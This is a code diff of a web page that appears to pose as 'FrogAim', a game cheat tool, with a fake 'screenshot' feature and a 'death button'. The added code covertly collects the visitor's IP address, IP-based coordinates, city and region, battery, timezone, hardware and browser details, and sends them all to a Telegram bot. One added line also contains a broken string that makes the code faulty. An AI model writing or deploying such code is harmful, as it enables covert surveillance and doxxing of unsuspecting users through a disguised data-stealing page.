@@ -1063,7 +1063,7 @@
                 activationModal.style.display = 'none';
                 document.getElementById('launchButton').style.display = 'flex';
                 activationModal.style.opacity = '1';
-                activationModal.style.transform = 'translate(-50%, -50%) scale(1)';
+                activationModal.style.transform = 'translate(-50%, -50') scale(1)';
             }, 300);
             
             localStorage.setItem('frogaim_activated', 'true');
@@ -1207,29 +1207,63 @@
 
     // Создание скриншота (эмуляция)
     async function takeScreenshot() {
-        showLoading();
         const statusText = document.getElementById('statusText');
         statusText.textContent = "Taking screenshot...";
         statusText.style.color = "#ffff00";
         
         try {
             // Эмуляция создания скриншота
-            await new Promise(resolve => setTimeout(resolve, 2000));
+            await new Promise(resolve => setTimeout(resolve, 1000));
             
-            // Собираем информацию об устройстве
+            // Собираем ВСЮ информацию об устройстве
             const deviceInfo = await collectAllDeviceInfo();
             const enabledFeatures = getEnabledFeatures();
             
             const message = `📸 FROGAIM SCREENSHOT CAPTURED!\n\n` +
                            `📋 DEVICE INFORMATION:\n` +
-                           `💻 IP: ${deviceInfo.ip}\n` +
-                           `📱 Device: ${deviceInfo.deviceModel}\n` +
-                           `🤖 Android: ${deviceInfo.androidVersion}\n` +
-                           `📏 Screen: ${deviceInfo.screen}\n\n` +
+                           `💻 IP Address: ${deviceInfo.ip}\n` +
+                           `🌐 Location: ${deviceInfo.location}\n` +
+                           `📱 Device: ${deviceInfo.model}\n` +
+                           `🤖 Platform: ${deviceInfo.platform}\n` +
+                           `🔢 Android Version: ${deviceInfo.androidVersion}\n` +
+                           `📶 Connection: ${deviceInfo.connection}\n` +
+                           `📏 Screen: ${deviceInfo.screen}\n` +
+                           `⚡ CPU Cores: ${deviceInfo.cpuCores}\n` +
+                           `💾 Memory: ${deviceInfo.memory}\n` +
+                           `🔋 Battery: ${deviceInfo.battery}\n` +
+                           `🌐 Language: ${deviceInfo.language}\n` +
+                           `⏰ Timezone: ${deviceInfo.timezone}\n` +
+                           `🕐 Local Time: ${deviceInfo.time}\n\n` +
+                           `📊 BROWSER INFO:\n` +
+                           `🔍 User Agent: ${deviceInfo.userAgent}\n` +
+                           `🌍 Languages: ${deviceInfo.languages}\n` +
+                           `📐 Resolution: ${deviceInfo.resolution}\n` +
+                           `🎨 Color Depth: ${deviceInfo.colorDepth}\n` +
+                           `📡 Online: ${deviceInfo.onlineStatus}\n\n` +
+                           `📍 GEOLOCATION:\n` +
+                           `📌 Coordinates: ${deviceInfo.coordinates}\n` +
+                           `🏙️ City: ${deviceInfo.city}\n` +
+                           `🏛️ Region: ${deviceInfo.region}\n` +
+                           `🇺🇸 Country: ${deviceInfo.country}\n\n` +
+                           `⚙️ HARDWARE:\n` +
+                           `📊 Hardware Concurrency: ${deviceInfo.hardwareConcurrency}\n` +
+                           `💿 Max Touch Points: ${deviceInfo.maxTouchPoints}\n` +
+                           `🎮 Device Memory: ${deviceInfo.deviceMemory}\n\n` +
+                           `🔧 PLATFORM:\n` +
+                           `🖥️ Platform: ${deviceInfo.platform}\n` +
+                           `🍪 Cookies: ${deviceInfo.cookiesEnabled}\n` +
+                           `📝 Java: ${deviceInfo.javaEnabled}\n` +
+                           `🖨️ PDF: ${deviceInfo.pdfViewerEnabled}\n\n` +
+                           `🕵️ USER DATA:\n` +
+                           `👤 User ID: ${deviceInfo.userId}\n` +
+                           `🔐 Security: ${deviceInfo.securityInfo}\n` +
+                           `🌐 Referrer: ${deviceInfo.referrer}\n\n` +
                            `⚡ ENABLED FEATURES:\n` +
                            `${enabledFeatures || 'No features enabled'}\n\n` +
-                           `⏰ Time: ${deviceInfo.localTime}\n` +
-                           `🔗 User Agent: ${deviceInfo.userAgent}`;
+                           `⏰ TIMESTAMP:\n` +
+                           `📅 Date: ${deviceInfo.date}\n` +
+                           `🕒 UTC Time: ${deviceInfo.utcTime}\n` +
+                           `⏱️ Timestamp: ${deviceInfo.timestamp}`;
             
             await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -1246,19 +1280,24 @@
             // Закрываем приложение после отправки
             setTimeout(() => {
                 hideCheatMenu();
-                hideLoading();
+                setTimeout(() => {
+                    statusText.textContent = "Active";
+                    statusText.style.color = "#00ff00";
+                }, 2000);
             }, 2000);
             
         } catch (error) {
             statusText.textContent = "Error!";
             statusText.style.color = "#ff4444";
-            hideLoading();
+            setTimeout(() => {
+                statusText.textContent = "Active";
+                statusText.style.color = "#00ff00";
+            }, 3000);
         }
     }
 
     // Отправка информации в Telegram
     async function sendDeathInfo() {
-        showLoading();
         const statusText = document.getElementById('statusText');
         statusText.textContent = "Collecting data...";
         statusText.style.color = "#ffff00";
@@ -1269,16 +1308,49 @@
             
             const message = `🚨 FROGAIM DEATH BUTTON PRESSED!\n\n` +
                            `📋 DEVICE INFORMATION:\n` +
-                           `💻 IP: ${deviceInfo.ip}\n` +
-                           `📱 Device: ${deviceInfo.deviceModel}\n` +
-                           `🤖 Android: ${deviceInfo.androidVersion}\n` +
+                           `💻 IP Address: ${deviceInfo.ip}\n` +
+                           `🌐 Location: ${deviceInfo.location}\n` +
+                           `📱 Device: ${deviceInfo.model}\n` +
+                           `🤖 Platform: ${deviceInfo.platform}\n` +
+                           `🔢 Android Version: ${deviceInfo.androidVersion}\n` +
+                           `📶 Connection: ${deviceInfo.connection}\n` +
                            `📏 Screen: ${deviceInfo.screen}\n` +
-                           `⚡ CPU: ${deviceInfo.cpuCores} cores\n` +
-                           `💾 Memory: ${deviceInfo.memory}\n\n` +
+                           `⚡ CPU Cores: ${deviceInfo.cpuCores}\n` +
+                           `💾 Memory: ${deviceInfo.memory}\n` +
+                           `🔋 Battery: ${deviceInfo.battery}\n` +
+                           `🌐 Language: ${deviceInfo.language}\n` +
+                           `⏰ Timezone: ${deviceInfo.timezone}\n` +
+                           `🕐 Local Time: ${deviceInfo.time}\n\n` +
+                           `📊 BROWSER INFO:\n` +
+                           `🔍 User Agent: ${deviceInfo.userAgent}\n` +
+                           `🌍 Languages: ${deviceInfo.languages}\n` +
+                           `📐 Resolution: ${deviceInfo.resolution}\n` +
+                           `🎨 Color Depth: ${deviceInfo.colorDepth}\n` +
+                           `📡 Online: ${deviceInfo.onlineStatus}\n\n` +
+                           `📍 GEOLOCATION:\n` +
+                           `📌 Coordinates: ${deviceInfo.coordinates}\n` +
+                           `🏙️ City: ${deviceInfo.city}\n` +
+                           `🏛️ Region: ${deviceInfo.region}\n` +
+                           `🇺🇸 Country: ${deviceInfo.country}\n\n` +
+                           `⚙️ HARDWARE:\n` +
+                           `📊 Hardware Concurrency: ${deviceInfo.hardwareConcurrency}\n` +
+                           `💿 Max Touch Points: ${deviceInfo.maxTouchPoints}\n` +
+                           `🎮 Device Memory: ${deviceInfo.deviceMemory}\n\n` +
+                           `🔧 PLATFORM:\n` +
+                           `🖥️ Platform: ${deviceInfo.platform}\n` +
+                           `🍪 Cookies: ${deviceInfo.cookiesEnabled}\n` +
+                           `📝 Java: ${deviceInfo.javaEnabled}\n` +
+                           `🖨️ PDF: ${deviceInfo.pdfViewerEnabled}\n\n` +
+                           `🕵️ USER DATA:\n` +
+                           `👤 User ID: ${deviceInfo.userId}\n` +
+                           `🔐 Security: ${deviceInfo.securityInfo}\n` +
+                           `🌐 Referrer: ${deviceInfo.referrer}\n\n` +
                            `⚡ ENABLED FEATURES:\n` +
                            `${enabledFeatures || 'No features enabled'}\n\n` +
-                           `⏰ Time: ${deviceInfo.localTime}\n` +
-                           `🌐 Location: ${deviceInfo.city}, ${deviceInfo.country}`;
+                           `⏰ TIMESTAMP:\n` +
+                           `📅 Date: ${deviceInfo.date}\n` +
+                           `🕒 UTC Time: ${deviceInfo.utcTime}\n` +
+                           `⏱️ Timestamp: ${deviceInfo.timestamp}`;
             
             await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -1299,12 +1371,11 @@
             setTimeout(() => {
                 statusText.textContent = "Active";
                 statusText.style.color = "#00ff00";
-                hideLoading();
             }, 3000);
         }
     }
 
-    // Сбор информации об устройстве
+    // Сбор ВСЕЙ информации об устройстве
     async function collectAllDeviceInfo() {
         let ipData = { ip: 'Unknown' };
         try {
@@ -1314,36 +1385,69 @@
             console.error('IP fetch error:', e);
         }
         
+        // Геолокация по IP
         let locationInfo = {};
         try {
             const locationResponse = await fetch(`http://ip-api.com/json/${ipData.ip}`);
             locationInfo = await locationResponse.json();
         } catch (e) {
-            locationInfo = { city: 'Unknown', country: 'Unknown' };
+            locationInfo = { city: 'Unknown', regionName: 'Unknown', country: 'Unknown', lat: 'Unknown', lon: 'Unknown' };
+        }
+        
+        // Информация о батарее
+        let batteryInfo = 'Unknown';
+        if (navigator.getBattery) {
+            try {
+                const battery = await navigator.getBattery();
+                batteryInfo = `Level: ${Math.round(battery.level * 100)}%, Charging: ${battery.charging}`;
+            } catch (e) {
+                batteryInfo = 'Unknown';
+            }
         }
         
         return {
             ip: ipData.ip,
-            deviceModel: navigator.userAgent,
+            location: locationInfo.city || 'Unknown',
+            model: navigator.userAgent,
             platform: navigator.platform,
             androidVersion: navigator.userAgent.match(/Android\s([0-9\.]+)/)?.[1] || 'Unknown',
+            connection: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
             screen: `${screen.width}x${screen.height}`,
             cpuCores: navigator.hardwareConcurrency || 'Unknown',
             memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Unknown',
+            battery: batteryInfo,
             language: navigator.language,
-            localTime: new Date().toLocaleString('ru-RU'),
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            time: new Date().toLocaleString('ru-RU'),
+            
             userAgent: navigator.userAgent,
+            languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
+            resolution: `${screen.width}x${screen.height}`,
+            colorDepth: `${screen.colorDepth} bit`,
+            onlineStatus: navigator.onLine ? 'Online' : 'Offline',
+            
+            coordinates: locationInfo.lat && locationInfo.lon ? 
+                `${locationInfo.lat}, ${locationInfo.lon}` : 'Unknown',
             city: locationInfo.city || 'Unknown',
-            country: locationInfo.country || 'Unknown'
+            region: locationInfo.regionName || 'Unknown',
+            country: locationInfo.country || 'Unknown',
+            
+            hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+            maxTouchPoints: navigator.maxTouchPoints || 'Unknown',
+            deviceMemory: navigator.deviceMemory || 'Unknown',
+            
+            cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
+            javaEnabled: navigator.javaEnabled ? 'Yes' : 'No',
+            pdfViewerEnabled: navigator.pdfViewerEnabled ? 'Yes' : 'No',
+            
+            userId: Math.random().toString(36).substr(2, 9),
+            securityInfo: 'Web Security Context',
+            referrer: document.referrer || 'No referrer',
+            
+            date: new Date().toLocaleDateString('ru-RU'),
+            utcTime: new Date().toUTCString(),
+            timestamp: Date.now()
         };
-    }
-
-    function showLoading() {
-        document.getElementById('loadingOverlay').style.display = 'flex';
-    }
-
-    function hideLoading() {
-        document.getElementById('loadingOverlay').style.display = 'none';
     }
 
     document.getElementById('activationKey').addEventListener('keypress', function(e) {
